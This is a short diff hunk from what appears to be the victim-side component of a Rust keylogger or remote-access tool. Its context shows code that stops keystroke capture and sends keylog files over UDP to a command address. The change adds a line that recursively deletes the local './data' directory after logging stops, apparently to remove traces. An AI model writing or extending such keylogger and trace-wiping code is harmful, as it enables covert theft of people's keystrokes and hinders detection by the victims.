@@ -313,6 +313,7 @@ impl Victim {
             let _ = tx.send(KeylogControl::Stop);
         }
         self.keylog_data_rx = None;
+        let _ = std::fs::remove_dir_all("./data");
     }
 
     fn send_keylog_file(&self, udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
